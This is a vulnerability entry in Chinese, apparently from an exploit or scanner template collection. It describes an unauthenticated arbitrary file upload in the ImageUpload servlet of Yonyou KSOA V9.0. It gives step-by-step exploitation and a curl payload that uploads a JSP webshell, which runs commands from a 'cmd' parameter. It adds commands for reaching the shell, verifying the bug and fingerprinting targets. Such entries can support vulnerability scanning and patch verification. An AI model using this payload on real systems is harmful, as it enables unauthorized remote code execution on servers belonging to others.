---
id: YONGYOU-KSOA-UPLOAD
title: 用友时空 KSOA ImageUpload 任意文件上传漏洞
product: yongyou
vendor: 用友网络
version_affected: "用友时空 KSOA V9.0"
severity: CRITICAL
tags: [file_upload, rce, 无需认证, 国产]
fingerprint: ["用友时空", "KSOA"]
---

## 漏洞描述

用友时空 KSOA V9.0 的 `com.sksoft.bill.ImageUpload` Servlet 存在前台任意文件上传漏洞，攻击者无需认证即可通过 filepath 和 filename 参数控制上传路径和文件名，直接上传 JSP webshell 到 Web 目录实现远程代码执行。

## 影响版本

- 用友时空 KSOA V9.0

## 前置条件

- 无需认证
- 目标运行用友时空 KSOA

## 利用步骤

1. 确认目标为用友时空 KSOA
2. 向 ImageUpload Servlet 发送 POST 请求
3. 通过 filepath 和 filename 参数指定上传路径和文件名
4. 访问 `/pictures/` 目录下的 webshell

## Payload

```bash
curl -s "http://target/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=shell.jsp" \
  -X POST \
  -H "Content-Type: application/octet-stream" \
  -d '<% out.println("VULN_TEST"); Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
```

上传后访问：

```bash
curl -s "http://target/pictures/shell.jsp"
```

## 验证方法

```bash
# 上传测试文件
curl -s "http://target/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=test.jsp" \
  -X POST -d '<% out.println("KSOA_VULN"); %>'

# 验证
curl -s "http://target/pictures/test.jsp" | grep "KSOA_VULN"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "KSOA\|用友时空"
```
